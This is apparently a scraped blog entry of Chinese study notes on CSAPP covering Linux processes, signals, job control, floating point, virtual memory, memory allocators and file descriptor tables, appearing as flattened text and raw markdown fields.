内核默认阻塞当前信号Handler正在处理的信号的那种类型的待处理信号 sigprocmask函数 编写信号handler的原则 handler要尽可能简单，比如只是设置一个flag handler里只能调用异步信号安全的函数（比如只访问局部变量的函数，比如不能被信号中断的函数）。异步信号安全不同于线程安全，线程安全中，对于非线程安全的函数的调用，可以通过持有同一把锁来实现线程安全；但是因为信号是异步的，所以如果在持有锁时信号到来，handler运行，则会死锁——因为handler调用该函数前也要持有锁，CSAPP 3rd（英文版）的P757有一个异步线程安全的函数的表，其中不包括exit、printf等常见函数 保存和恢复errno。因为信号handler中调用的函数可能会在失败时设置errno，所以可能会干扰正常程序中的errno，所以需要在刚进入handler时保存errno，而在退出前恢复errno 如果访问了全局的数据结构，那么需要阻塞所有信号 使用volatile声明flag，volatile要求编译器每次在代码中引用flag时，都从内存中读取该值 使用sig_atomic_t声明变量，对其读或写是原子的，不会中断，因为可以用一条指令来实现，所以不需要暂时的阻塞信号 信号不排队，所以接收到信号后要在循环中处理，而不能一个信号对应一次处理 sigsuspend可以用来显式的等待信号 不对SIGKILL做响应的情况 首先，SIGKILL不能被捕获或者忽略（SIGSTOP也是） 但是TASK_UNINTERRUPTIBLE的进程是不响应任何信号的，所以SIGKILL也无效 僵尸进程无法被SIGKILL杀死，杀死僵尸进程的方法是其父进程终止或其父进程调用wait 虚拟内存MISC 能力：使得可以把内存看作磁盘的cache；为进程提供一个一直的地址空间；保护进程的地址空间 地址空间：一个非负整数地址的有序集合 TLBI（TLB index）的索引是VPN（virtual page number）的低t bit索引的 需要从cache、主存获得PTE是需要MMU计算PTEA的 Linux中Swap（即：交换分区），类似于Windows的虚拟内存，就是当内存不足的时候，把一部分硬盘空间虚拟成内存使用,从而解决内存容量不足的情况。一旦一个虚拟页面被初始化（被按需页面调度进来，或者已经映射了二进制0页面（有对应的物理页）），则总是在swp space交换来交换去 计算物理地址的过程（不缺页版本） 处理器生成虚拟地址，并传递给MMU MMU生成PTE（页表条目）地址，并从高速缓存、主存请求得到它 高速缓存、主存向MMU返回PTE MMU构造物理地址，并传递给高速缓存、主存 高速缓存、主存返回所请求的数据字 计算物理地址的过程（缺页版本） 处理器生成虚拟地址，并传递给MMU MMU生成PTE（页表条目）地址，并从高速缓存、主存请求得到它 高速缓存、主存向MMU返回PTE PTE中的有效位是0，所以MMU触发一次异常，传递给CPU中的控制到OS内核的中的缺页处理程序 缺页Handler确定中物理内存中的牺牲页，如果这个页面是dirty，则换出到磁盘 缺页handler把页面调入主存并更新内存中PTE 缺页handler返回原来的进程并再次执行导致缺页的指令 CopyOnWrite 只要进程没有试图写这些COW的区域，那么就可以共享 如果进程试图写这些区域中的某个页面时，就会触发一个保护故障，从而会在物理内存中创建这个页面的一个新副本，更新页表条目指向这个新副本 把复制副本的工作推迟到了最后时刻，从而最充分的利用了物理内存 Linux的虚拟内存和缺页处理 Linux将虚拟内存组织成区域的集合，一个区域是已经存在的（已分配的）虚拟内存的连续片（比如代码段、数据段、堆等） 每个存在的虚拟页面都保存在某个区域中 区域使得内核无需记录那些不存在的虚拟页 区域链表可以通过位于内核虚拟内存的task_struct中相关信息获得 mm_struct的mmap：指向一个vm_area_structs的链表，每个vm_area_structs都描述了当前虚拟地址空间的一个区域 mm_struct的pgd：指向第一级页表（页全局目录）的基址，内核运行这个进程时，把pgd放在CR3控制寄存器 task_struct：包含或指向内核运行该进程所需要的所有信息，比如PID、指向用户栈的指针、可执行目标文件的名字、程序计数器 Linux虚拟内存的缺页异常的处理程序 使用内核为每个进程维护的区域结构的链表来判断是否是 访问不存在的页面(从而段错误) 缺页是因为内存访问不合法（比如写一个只读页面）导致的（从而保护异常） 正常缺页 为什么不使用PTE的是否为null来判断呢？这样子就要维护所有的PTE，其中有的有效位为1有的为0有的PTE的某个字段为null标志这是未被映射的虚拟内存页 动态内存分配 碎片 内部碎片（一个已分配的块比payload大时发生，只取决于分配器的实现以及以前的请求模式） 外部碎片（空闲内存合计起来足以满足一个请求，但是没有单独一块满足时，不仅取决于以前的模式、分配器的工作方式，还取决与未来请求的模式） 分离的空闲链表：比如可以$[2^n-1,2^{n+1}]$这个区间大小的页维护在一个空闲链表中 简单分离存储：不分割，不合并 分离适配：确定请求的大小类，然后首次适配（找不到就到更大的大小类去找）。可选的分割，剩余部分insert到适当的空闲链表中。实在没有，就请求OS分配，然后从这个新的中分配出Request的那块，剩下的insert到空闲链表中。释放时执行合并，结果放在相应的空闲链表。malloc就是这样做的 buddy 每个大小类都是2的幂，为了找到$2^k$，需要找$2^p(k\\leq p)$，如果$k&lt;p$，则递归的二分这个块，每次二分时，剩下的另一块都insert到空闲链表中。要释放时，合并空闲的buddy，但遇到一个已分配的buddy时，停止合并。buddy之间的地址差异只是1bit。如果大部分请求不是2的幂大小，则内部碎片多 Linux的文件 内核用三个数据结构来表示打开的文件 描述符表 每个进程都有自己的描述符表 由进程打开的文件描述符索引 每个打开的描述符表项指向文件表的一个表项 文件表 所有进程共享这个表，表示打开的文件集合 每个表项包含：当前文件位置、引用计数（指向该表项的描述符表项数目），指向v-node表中的对应表项的指针 内核不会删除一个文件表表项，直到其引用计数为0 多个打开文件表的表项可以指向同一个v-node表的表项，比如同一进程两次调用open同一文件，是不同的文件句柄，同样的inode，这样子每个都有自己的文件位置 v-node表 所有进程共享这张v-node表 每个表项包含stat结构中的大多数信息 包含文件大小、文件类型、file access fork中，子进程复制父进程的描述符表，所以指向相同的打开文件表表项 io重定向（比如dup2）则是使得两个描述符表项指向同一个打开文件表的表项","raw":"---\ntitle: My CSAPP Note\ndate: 2019-05-01 10:09:50\ntags:\n- CSAPP\n- Linux\n- OS\ncategories:\n- CSAPP\n---\n\n### double to unsigned long long \n\n```c\nunsigned long long a = (unsinged long long)(2.0); // a==2\nunsigned long long a = (unsinged long long)(-2.0); // a==140735559226888\n```\n- double to long long用的是特殊的指令\n\n### 进程\n\n- 进程是内核定义的抽象实体，并为该实体分配可用以执行程序的各项系统资源\n- 提供一个假象：当前程序是OS中的唯一程序\n- 定义：一个执行中的程序的实例\n- 一个独立的逻辑控制流，一个私有的地址空间\n- 地址空间，从低到高是\n   - x86-64从0x400000开始，x86-32从0x8048000开始，gcc的`-fPIE`(Position-independent executables)则会使得EP变成0x10a0，不清楚运行时是否会变\n   - 只读代码段（.init, .rodata, .text）\n   - 读/写段（.data, .bss），包含显式初始化的全局变量和静态变量，跟只读代码段一样都是从可执行文件中加载的\n   - 运行时堆（堆顶由brk指示(brk，由内核维护，进程私有)，向上增长）\n   - 共享库的内存映射区域（向上增长）\n   - 用户栈（运行时创建，rsp是栈指针，向下增长）\n   - 内核虚拟内存（依次为代码、数据、物理内存映射（大小等于DRAM的数目）、页表、task和mm结构、内核栈（内核在进程的上下文中执行代码时使用的栈），用户不可见）\n- 进程的三种状态（从程序员的视角来看）\n  - 运行\n  - 停止，不会被调度，收到`SIGSTOP`、`SIGTSTP`、`SIGTTIN`，`SIGTTOU`信号时停止直到收到`SIGCONT`\n    - `SIGSTOP`：不是来自终端的停止信号，不能被捕获或忽略\n    - `SIGTSTP`：来自终端的停止信号，键入`Ctrl+Z`会发送`SIGTSTP`给前台job的每个进程，默认是停止（挂起）前台job\n    - `SIGTTIN`\n       > Only the foreground job receives terminal input. **It is not an error for a background job to try to read from the terminal, but the terminal driver detects this and sends a special signal to the background job: SIGTTIN.** This signal normally stops the background job; **by using the shell, we are notified of this event and can bring the job into the foreground so that it can read from the terminal**. \n       > ```\n       > $ cat > /tmp/23 &\n       > [1] 7739\n       >\n       > $ \n       > [1]  + 7739 suspended (tty input)  bat > /tmp/23\n       > \n       > $ fg\n       > [1]  + 7739 continued  bat > /tmp/23\n       > testMsg\n       > ^C\n       > \n       > $ /bin/cat /tmp/23 \n       > testMsg\n       > ```\n    - `SIGTTOU`\n       > When we disallow background jobs from writing to the controlling terminal, cat will block when it tries to write to its standard output, because the terminal driver identifies the write as coming from a background process and sends the job the SIGTTOU signal. As with the previous example, when we use the shell’s fg command to bring the job into the foreground, the job completes.\n       > ```\n       > $ /bin/cat /tmp/23 &\n       > [1] 8398\n       > testMsg                                                                                                                                                  >      \n       > [1]  + 8398 done       /bin/cat /tmp/23\n       > \n       > $ fg\n       > fg: no current job\n       > \n       > $ stty tostop \n       > \n       > $ /bin/cat /tmp/23 &\n       > [1] 8412\n       > [1]  + 8412 suspended (tty output)  /bin/cat /tmp/23                                                                                             \n       > \n       > $ fg\n       > [1]  + 8412 continued  /bin/cat /tmp/23\n       > testMsg\n       > ```\n\n  - 终止，永久停止。三种原因：收到一个信号，该信号handler终止该进程，从主程序返回，调用exit函数（exit函数不返回）（可以通过`exit(status)`终止进程并返回status，也可以通过`return status`终止进程并返回status）\n- 进程的状态\n   - 来自*linux内核设计与实现*\n   - `TASK_RUNNING`：进程是可执行的，可能正在执行，或在运行队列中等待执行。这是进程在用户空间中执行的唯一可能状态。内核空间中正在执行的进程也是这种状态\n   - `TASK_INTERRUPTIBLE`：进程正在睡眠（也就是被阻塞），到达某些条件达成，一旦条件达成，内核就会把进程状态设置为RUNNING。处于此状态的进程会因为接收到信号而提前被唤醒并随时准备投入运行\n   - `TASK_UNINTERRUPTIBLE`：与`TASK_INTERRUPTIBLE`的差别在于，就算接受到信号也不会被唤醒（即使是SIGKILL信号）或准备投入运行。通常在进程必须在等待时不受干扰或等待的事件很快就会发生时出现（比如这个任务正在进行重要的操作，甚至可能持有一个信号量）。因为不对信号做响应，所以较之可中断的状态，用的较少。（ps中看到的`D`状态的进程就是这种状态）\n   - `__TASK_TRACED`：被其他进程跟踪的进程，比如通过ptrace对调试程序进行跟踪\n   - `__TASK_STOPPED`：进程停止执行，没有投入运行也不能投入运行。发生在接受到`SIGSTOP`，`SIGTSTP`，`SIGTTIN`，`SIGTTOU`信号时，调试期间受到任何信号也会使得进程进入这状态\n   - 转换图见书P24(41)\n   - Ref: ps manual\n      ```\n      the state of a process:\n              D    uninterruptible sleep (usually IO)\n              I    Idle kernel thread\n              R    running or runnable (on run queue)\n              S    interruptible sleep (waiting for an event to complete)\n              T    stopped by job control signal\n              t    stopped by debugger during the tracing\n              W    paging (not valid since the 2.6.xx kernel)\n              X    dead (should never be seen)\n              Z    defunct (\"zombie\") process, terminated but not reaped by its parent\n       ```\n- 子进程终止了，需要父进程回收，父进程终止时，子进程没有终止（可以是僵尸进程），则init（pid=1，不终止）为子进程的养父\n\n#### 作业（job）和进程组\n\n- unix shell使用job表示为对一条命令行求值而创建的进程\n- 任何时刻，至多只有一个前台作业和0或多个后台作业\n- 例子：`ls | sort`会创建一个由两个进程组成的前台作业，两个进程通过unix管道连接起来\n\n#### 进程组\n\n- shell为每个job创建一个独立的进程组\n- 进程组ID通常取自job中父进程中的一个\n\n#### daemon\n\n- 生命周期长，通常在系统启动时就被创建并一直运行到系统关闭\n- 在后台运行并且不拥有任何控制终端，这确保了内核永远不会为daemon自动生成任何任务控制信号以及终端相关的信号\n- 通常以`d`作为程序名称的后缀\n- 特定的daemon会作为内核线程运行，此类的daemon的代码是内核的一部分，通常在系统启动时被创建，ps列出的线程中，这些daemon会用`[]`括起来\n- 很多标准的daemon是通过系统关闭时执行特定于应用程序的脚本来关闭的，不以这种方式关闭的daemon会收到`SIGTERM`信号，因为系统关闭时，init进程会向所有其子进程发送这个信号，默认SIGTERM会终止一个进程，可以为这个信号建立处理器。init在发出SIGTERM信号5s后会发送SIGKILL信号\n- 创建daemon过程，见TLPI 37.2\n\n#### 创建新进程\n\n- fork后，子进程通过execve调用启动加载器\n- 加载器删除子进程现有的虚拟内存段，并创建一组新的代码、数据、堆、栈段\n- loader跳转到`_start`地址，最终会调用main函数\n- 除了一些头部信息，加载过程中没有从磁盘到内存的数据复制，直到被引用时，OS才会使用页面调度机制自动将页面从磁盘传送到内存\n- fork\n   - 子进程与父进程的用户级虚拟地址空间相同的（互相独立）的一份副本，包括代码和数据段、堆、共享库、用户栈\n   - 相同的描述符表（所以可以读写父进程打开的任何文件）\n   - 最大的区别是有不同的PID\n   - 父进程返回子进程的pid，子进程返回0（pid总是非零）\n- vfork\n   - 在SUSv3已经标记为过时的，SUSv4则从规范中剔除了，CopyOnWrite的fork已经足够快了，并且有些OS还把vfork实现为fork\n   - 无需为子进程复制虚拟内存或页表，共享父进程的内存，直到成功执行`exec`或`_exit`（不是`exit`）\n   - 子进程执行`exec`或`_exit`之前，暂停执行父进程\n   - 子进程不应该调用`exit`退出，因为其会导致父进程stdio的缓冲区刷新和关闭（更详细的见TLPI 25.4）\n   - 保证子进程先于父进程获得调度获得CPU（fork无法保证这点）\n   - 系统是在内核空间为每个进程维护文件描述符表的，且在vfork调用期间复制该表，所以子进程对文件描述符表的操作不会影响到父进程（对stdio的操作会，然而虽然文件描述符表是不同的，但是打开文件表不是相同的吗，操作后不就改变了文件位置了吗）\n   - SUSv3指出，以下行为是未定义的\n      - 修改了出用于存储vfork返回值的`pid_t`变量之外的任何数据\n      - 从调用vfork的函数返回（我认为，应该是因为会影响栈）\n      - 在成功地调用`_exit`或执行了`exec`之前，调用了任何其他函数\n\n### IEEE754\n\n- 最高比特为sign（0为正，1为负），接下来的8bit（float32是8it，double64是11bit）是exp，剩下的是significand（尾数）\n- 规格化：`0<exp<255(2047)`，此时exp的含义是`exp-127(1023)`，尾数部分是`1.M`，`M`为尾数部分的二进制表达的数值。\n- 非规格化：`exp=0`，此时exp的含义是`exp=-126(-1022)`，尾数部分是`0.M`，要就是没有前缀`1`，从而，从`exp=1`到`exp=0`是平滑的过渡——exp没有变，然后对应的从`1.111111....`到`1`到`0.11111111111....`到`0`。其用于表示0和非常接近0的数，可能的数值均匀的接近于`0.0`\n- 无穷大：`exp=255(2047)`，尾数是全0\n- NaN：`exp=255(2047)`，尾数非0\n- 浮点数加法不具有结合律和分配率，有交换律\n- $1/+0=+\\infin$，$1/-0=-\\infin$\n\n### 汇编\n\n- 参数寄存器：`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`\n- 返回值：`rax`\n- 栈指针：`rsp`\n- 对抗缓冲区溢出攻击\n   - ASLR(Address space layout randomization)（每次运行，程序代码、库代码、栈、全局变量、堆在内存的不同区域）\n   - 栈破坏检测（金丝雀值，栈帧中任何局部缓冲区和栈状态之间存一个特殊的金丝雀值）\n   - 限制可执行代码的区域（一些内存页上的东西不允许执行）\n\n### 数据对齐\n\n- 计算机系统对基本数据类型的合法地址做出一些限制\n- 对齐简化了处理器和内存系统之间的接口设计——比如，读一个8B东西读一次就行，不必读两次\n- 无论数据是否对齐，x86-64都可以正确工作，但是可以提高系统性能。另外，没有对其，SSE指令可能无法正确执行，AVX对于对齐么有强制性要求\n- 对于struct，为了使得结构内每个字段都对其，会有padding，结尾可能有padding，以满足结构数组内每个struct的对齐要求\n- 页表中，我们可以查询得到`PPN`（physical page number），但是`PPO`（物理页内位移）是低k位，这意味着，每个页需要$2^k$对齐，这样子才能使得`PPN`描述出该页的起始位置——因为我们都是拿到起始位置后加上offset（正数，也是虚拟地址的低k bit）获得target。PPO的12bit刚好与cache的页内偏移位数+组数目的bit数相同，所以可以直接使用PPO去索引相应的组和具体的word，然后等待PPN，与组内的那些tag来查找匹配\n\n### 优化性能\n\n- 消除不必要的内存引用，使得可以编译器敢于缓存在寄存器中\n- 循环展开，一方面减少循环控制代码，另一方面可以有更大的优化空间\n- 提高并行性，比如进行累计运算时，使用多个acc变量，从而增加关键路径的数目，比如利用结合律，使得一些运算可以并行执行( $a*b*c*d \\rightarrow (a*b)*(c*d)$)，后者可以更快\n- 减少读写相关的代码：比如刚写完个一个cell，立刻就又要读了\n\n### 存储\n\n- 磁盘寻道时，任意时刻读写头都位于同一柱面\n- SSD的随机写性能较低，因为一个擦除过的块才可能被写\n- 局部性原理的体现：cache、虚拟内存每次加载一个页\n- cache\n  - 全相联cache：只有一个组，电路必须并行的搜索许多tag，所以昂贵、难度大，只适合作为非常小的cache，比如TLB\n  - 组相联：一个组有多路\n  - 直接映射\n  - 写：直写，每次都下一级cache，引起总线流量。写回，尽可能推迟更新下一级，但是要维护dirty bit。对于较长的传送时间，通常更倾向于写回而不是直写。\n  - 写不命中：写分配，加载下一级的块上来，然后更新这个块。非写分配，直接写到下一级。直写cache通常是非写分配的，写会cache通常是写分配的。\n  - 写、写不命中的细节随系统而变化\n  - 每次加载、驱逐都是一行一行的来\n\n\n### 动态共享库\n\n- 好处\n  - 其text段在内存中只需要一份拷贝，可以被映射到不同进程的地址空间\n  - 可以热更新服务器应用\n  - 应用无需重新编译，只需要重新分发共享库即可\n\n### 异常控制流\n\n- 系统需要对系统状态的变化做出反应，这些状态不一定跟当前正在执行的进程有关。比如IO设备、定时器产生的信号\n- 可以发生在：硬件层（硬件的信号导致转移到异常处理程序）、OS层（比如上下文切换）、应用层（比如一个进程给另一个进程发送信号，从而接受者会突然转去执行信号处理程序，比如非本地跳转）\n- ECF是计算机系统实现并发的基本机制，并发的例子有\n   - 中断应用程序执行的**异常处理程序**\n   - 中断应用程序执行的**信号处理程序**\n   - 在时间上重叠执行的进程和线程\n\n#### 异常\n\n- 这里的异常包括同步异常（trap、fault、abort）和异步异常（中断），有些厂商的手册中，异常只包括同步事件引起的控制流的改变\n- 异常是控制流中的突变，用来响应处理器状态中的某些变化\n- 异常号\n   - 每种类型的异常都分配了一个唯一的非负整数的异常号\n   - 一些由处理器的设计者分配（比如被零除，缺页、内存访问违例、断点、算术运算溢出）\n   - 其他由OS内核（OS内核：OS常驻内存的那部分）的设计者分配（比如syscall、来自外部IO设备的信号）\n- 异常表\n   - 系统启动时（计算机重启或加电时）OS分配和初始化的一张跳转表\n   - 条目`k`包含异常`k`的handler的地址\n   - 异常表的起始地址放在一个叫做异常表基址寄存器的CPU寄存器中\n- 过程\n   - 在运行时（OS执行某个程序时），处理器检测到发生一个事件（比如page fault、算数溢出、除零、系统定时器产生的信号、IO请求完成等），并确定对应的异常号`k`\n   - 随后处理器触发异常，方法是执行间接过程调用，通过异常表的表目`k`转到相应的handler\n   - 处理完后可能会返回当前指令、返回给当前指令的下一条指令、终止被中断的程序\n- 调用过程\n   - 处理器将返回地址入栈，根据异常类型，返回地址可能是当前指令，可能是下一条指令。还需要入栈一些额外的信息，重新开始执行被中断的程序需要这些信息\n   - When control is being transferred from a user program to the kernel, all of these items are pushed onto the kernel's stack rather than onto the user's stack.(我猜，是不是如果是信号handler，则压入用户栈，否则内核栈)\n   - 异常handler运行在内核模式\n   - 硬件触发了异常后，剩下的工作都是软件的handler的。handler可以可选的执行“从中断返回”的指令，这将恢复现场并且切换为用户态（如果被中断的是一个用户程序的话），并将控制返回给被中断的程序\n\n- 异常的类别\n   - 中断：来自处理器外部的IO设备的信号的结果，异步，总是返回到下一条指令，其Handler常常称为中断处理程序\n      > - I/O interrupt from external device\t\n      > - Hittinng Ctrl-C at the keyboard\t\n      > - Arrival of a packet from\ta network\t\n      > - Arrival of data from a disk\t\n      - 过程举例\n         - 网络适配器，给处理器芯片的一个引脚发信号，并把中断号放在系统总线上，来触发中断，异常号标志了引起中断的设备\n         - 当前指令完成后，处理器注意到中断引脚的电压变高了，就从总线读取中断号，并调用相应的Handler\n   - trap：有意的异常(syscall, breakpoint traps, special instructions)，同步，返回到下一条指令\n      - syscall：用户执行`syscall n`，导致到一个异常处理程序的trap，这个handler解析参数，并调用适当的内核程序，`syscall`可以执行特权指令，并且可以访问内核中的栈\n   - fault：潜在可恢复的异常（错误情况引起的，比如缺页异常），同步，可能返回到当前指令（否则，Handler返回到内核中的abort例程）。故障发生时，处理器将控制权转移到handler，如果handler可以处理这个错误情况，那么就将控制返回到引起故障的指令，从而重新执行它，否则返回到abort例程\n   - abort：不可恢复的异常（通常是一些硬件错误），同步，不返回\n   - 异步异常是由处理器外部的IO设备中的事件产生的，不是由任何一条专门的指令造成的，同步异常是执行一条指令（这种指令叫做故障指令）的产物。（来自百度百科：**异步**双方不需要共同的时钟，也就是接收方不知道发送方什么时候发送）\n- 一般保护故障（异常13），通常是因为一个程序引用了一个未定义的虚拟内存区域，或者是尝试写一个readOnly的text段，Linux shell把这个报告为Segment fault\n\n- linux的syscall\n   - 每个syscall都有一个唯一的整数号，对应与一个到**内核中的跳转表**（这个**跳转表不同于异常表**）的偏移量\n   - 所有到linux syscall的参数都是通过通用寄存器而不是栈传递的。rax包含syscall号\n   - C函数库的wrapper需要将参数复制到寄存器\n   - 参数都是通过通用寄存器传递的，而不是通过栈传递的\n   - 按照惯例，`rax`包含系统调用号，`rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`包含最多的6个参数，以上顺序也是参数的顺序（第一个在rdi，第二个在rsi以此类推）\n   - 返回时，rcx、r11的内容会被破坏(应该就是caller save)，rax包含返回值，`-4095`到`-1`对应于负的errno\n   - \n   - 执行机器指令，引起处理器从用户态切换到内核态，并执行系统中断0x80的中断向量所指向的代码\n   - 响应中断0x80，内核调用`system_call()`例程，在内核栈保存寄存器值，根据syscall编号索引服务例程的地址。服务例程执行必要任务时，可能会在用户内存和内核内存之间传送数据，完成后返回给`system_call`例程\n   - 从内核栈中回复各寄存器的值，并将syscall的返回值放在栈上，返回wrapper，并切换到用户态\n\n- 内核态 vs 用户态\n\n  - 通常实现为，某个控制寄存器的一个mode bit来指示\n  - 用户态不允许特权指令，比如停止处理器、改变mode bit、发起IO，不能引用地址空间中内核区内的代码和数据，否则会保护故障\n  - 从用户态到内核态的唯一方法：通过诸如中断、故障、trap之类的异常。异常发生时，控制传递到处理程序，处理程序运行在内核模式\n  - `/proc`可以让用户模式进程访问内核数据结构\n  - 从2.6开始，`/sys`文件系统输出系统总线和设备的额外的底层信息\n\n- 上下文切换\n   - 一种较高层次的异常控制流，建立在前面讨论过的较低层次的异常机制之上，用来实现多任务 \n   - 上下文：内核重新启动一个被抢占的进程所需的状态，通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈、各种内核数据结构（比如页表、包含有关当前进程信息的进程表、包含进程已打开文件的信息的文件表）\n   - 步骤包括：保存当前进程的上下文，恢复某个被抢占的进程的上下文，将控制传递新恢复的进程\n   - syscall时，可能发生上下文切换，比如wait cond、read阻塞、sleep。即使syscall没有阻塞，内核也可以决定执行上下文切换\n   - 看起来就像，OS利用三种同步的异常来借机上下文切换，如果没有，就借助定时器的中断\n\n#### 信号\n\n- 软件形式的异常，允许进程和内核中断其他进程\n- 底层硬件异常是由内核的Handler处理，对用户进程不可见，而信号就提供了一种机制来通知用户进程发生了这个异常（比如一个进程试图除以0，那么内核就会给它发`SIGFPE`信号）\n- 发送信号：内核通过更新目的进程的上下文中的某个状态来发送一个信号。两种原因：内核检测到一个系统事件，所以发信号、kill函数（一个进程调用kill函数，显式的要求内核给这个进程发信号，可以给自己发信号）\n- 目的进程被内核强迫以某种方式对信号做出反应时，就接受了信号。内核把进程从内核态切换到用户态时，会强制用户接受信号（如果有的话）\n- 一个发出但是还没有接收的信号叫做待处理信号\n- 一个类型最多只有一个待处理信号\n- 进程可以有选择的阻塞某类信号，如果进程收到被阻塞的信号，那么会把这个信号加入到等待集合中，之后解除锁定后，会随之传递给此进程\n- 每个进程都只属于一个进程组，父进程和子进程同属一个进程组，可以调用`setpgid`来改变\n- 键入`Ctrl+C`会导致内核发送一个SIGINT给前台进程组的每个进程，默认情况下结果是终止前台job\n- 键入`Ctrl+Z`会发送`SIGTSTP`给前台job的每个进程，默认是停止（挂起）前台job\n- 信号处理程序可以被其他信号处理程序（不是同一个信号的handler）中断\n- 阻塞信号\n   - 内核默认阻塞当前信号Handler正在处理的信号的那种类型的待处理信号\n   - `sigprocmask`函数\n- 编写信号handler的原则\n   - handler要尽可能简单，比如只是设置一个flag\n   - handler里只能调用异步信号安全的函数（比如只访问局部变量的函数，比如不能被信号中断的函数）。异步信号安全不同于线程安全，线程安全中，对于非线程安全的函数的调用，可以通过持有同一把锁来实现线程安全；但是因为信号是异步的，所以如果在持有锁时信号到来，handler运行，则会死锁——因为handler调用该函数前也要持有锁，CSAPP 3rd（英文版）的P757有一个异步线程安全的函数的表，其中不包括exit、printf等常见函数\n   - 保存和恢复errno。因为信号handler中调用的函数可能会在失败时设置errno，所以可能会干扰正常程序中的errno，所以需要在刚进入handler时保存errno，而在退出前恢复errno\n   - 如果访问了全局的数据结构，那么需要阻塞所有信号\n   - 使用volatile声明flag，volatile要求编译器每次在代码中引用flag时，都从内存中读取该值\n   - 使用`sig_atomic_t`声明变量，对其读或写是原子的，不会中断，因为可以用一条指令来实现，所以不需要暂时的阻塞信号\n- 信号不排队，所以接收到信号后要在循环中处理，而不能一个信号对应一次处理\n- `sigsuspend`可以用来显式的等待信号\n- 不对`SIGKILL`做响应的情况\n   - 首先，`SIGKILL`不能被捕获或者忽略（`SIGSTOP`也是）\n   - 但是`TASK_UNINTERRUPTIBLE`的进程是不响应任何信号的，所以`SIGKILL`也无效\n   - 僵尸进程无法被`SIGKILL`杀死，杀死僵尸进程的方法是其父进程终止或其父进程调用wait\n\n### 虚拟内存\n\n#### MISC\n\n- 能力：使得可以把内存看作磁盘的cache；为进程提供一个一直的地址空间；保护进程的地址空间\n- 地址空间：一个非负整数地址的有序集合\n- TLBI（TLB index）的索引是VPN（virtual page number）的低t bit索引的\n- 需要从cache、主存获得PTE是需要MMU计算PTEA的\n- Linux中**Swap**（即：**交换分区**），类似于Windows的虚拟内存，就是当内存不足的时候，把一部分硬盘空间虚拟成内存使用,从而解决内存容量不足的情况。一旦一个虚拟页面被初始化（被按需页面调度进来，或者已经映射了二进制0页面（有对应的物理页）），则总是在swp space交换来交换去\n\n#### 计算物理地址的过程（不缺页版本）\n\n- 处理器生成虚拟地址，并传递给MMU\n- MMU生成PTE（页表条目）地址，并从高速缓存、主存请求得到它\n- 高速缓存、主存向MMU返回PTE\n- MMU构造物理地址，并传递给高速缓存、主存\n- 高速缓存、主存返回所请求的数据字\n\n#### 计算物理地址的过程（缺页版本）\n\n- 处理器生成虚拟地址，并传递给MMU\n- MMU生成PTE（页表条目）地址，并从高速缓存、主存请求得到它\n- 高速缓存、主存向MMU返回PTE\n- PTE中的有效位是0，所以MMU触发一次异常，传递给CPU中的控制到OS内核的中的缺页处理程序\n- 缺页Handler确定中物理内存中的牺牲页，如果这个页面是dirty，则换出到磁盘\n- 缺页handler把页面调入主存并更新内存中PTE\n- 缺页handler返回原来的进程并再次执行导致缺页的指令\n\n#### CopyOnWrite\n\n- 只要进程没有试图写这些COW的区域，那么就可以共享\n- 如果进程试图写这些区域中的某个页面时，就会触发一个保护故障，从而会在物理内存中创建这个页面的一个新副本，更新页表条目指向这个新副本\n- 把复制副本的工作推迟到了最后时刻，从而最充分的利用了物理内存\n\n#### Linux的虚拟内存和缺页处理\n\n- Linux将虚拟内存组织成区域的集合，一个区域是已经存在的（已分配的）虚拟内存的连续片（比如代码段、数据段、堆等）\n- 每个存在的虚拟页面都保存在某个区域中\n- 区域使得内核无需记录那些不存在的虚拟页\n- 区域链表可以通过位于内核虚拟内存的`task_struct`中相关信息获得\n   - `mm_struct`的`mmap`：指向一个`vm_area_structs`的链表，每个`vm_area_structs`都描述了当前虚拟地址空间的一个区域\n   - `mm_struct`的`pgd`：指向第一级页表（页全局目录）的基址，内核运行这个进程时，把`pgd`放在CR3控制寄存器\n   - `task_struct`：包含或指向内核运行该进程所需要的所有信息，比如PID、指向用户栈的指针、可执行目标文件的名字、程序计数器\n- Linux虚拟内存的缺页异常的处理程序\n   - 使用内核为每个进程维护的区域结构的链表来判断是否是\n       - 访问不存在的页面(从而段错误)\n       - 缺页是因为内存访问不合法（比如写一个只读页面）导致的（从而保护异常）\n       - 正常缺页\n   - 为什么不使用PTE的是否为null来判断呢？这样子就要维护所有的PTE，其中有的有效位为1有的为0有的PTE的某个字段为null标志这是未被映射的虚拟内存页\n\n#### 动态内存分配\n\n- 碎片\n   - 内部碎片（一个已分配的块比payload大时发生，只取决于分配器的实现以及以前的请求模式）\n   - 外部碎片（空闲内存合计起来足以满足一个请求，但是没有单独一块满足时，不仅取决于以前的模式、分配器的工作方式，还取决与未来请求的模式）\n- 分离的空闲链表：比如可以$[2^n-1,2^{n+1}]$这个区间大小的页维护在一个空闲链表中\n  - 简单分离存储：不分割，不合并\n  - 分离适配：确定请求的大小类，然后首次适配（找不到就到更大的大小类去找）。可选的分割，剩余部分insert到适当的空闲链表中。实在没有，就请求OS分配，然后从这个新的中分配出Request的那块，剩下的insert到空闲链表中。释放时执行合并，结果放在相应的空闲链表。malloc就是这样做的\n- buddy\n    - 每个大小类都是2的幂，为了找到$2^k$，需要找$2^p(k\\leq p)$，如果$k<p$，则递归的二分这个块，每次二分时，剩下的另一块都insert到空闲链表中。要释放时，合并空闲的buddy，但遇到一个已分配的buddy时，停止合并。buddy之间的地址差异只是1bit。如果大部分请求不是2的幂大小，则内部碎片多\n\n### Linux的文件\n\n- 内核用三个数据结构来表示打开的文件\n   - 描述符表\n      - 每个进程都有自己的描述符表\n      - 由进程打开的文件描述符索引\n      - 每个打开的描述符表项指向文件表的一个表项\n   - 文件表\n      - 所有进程共享这个表，表示打开的文件集合\n      - 每个表项包含：当前文件位置、引用计数（指向该表项的描述符表项数目），指向v-node表中的对应表项的指针\n      - 内核不会删除一个文件表表项，直到其引用计数为0\n      - 多个打开文件表的表项可以指向同一个v-node表的表项，比如同一进程两次调用open同一文件，是不同的文件句柄，同样的inode，这样子每个都有自己的文件位置\n   - v-node表\n      - 所有进程共享这张v-node表\n      - 每个表项包含stat结构中的大多数信息\n      - 包含文件大小、文件类型、file access\n- fork中，子进程复制父进程的描述符表，所以指向相同的打开文件表表项\n- io重定向（比如dup2）则是使得两个描述符表项指向同一个打开文件表的表项\n","content":"<h3 id=\"double-to-unsigned-long-long\"><a href=\"#double-to-unsigned-long-long\" class=\"headerlink\" 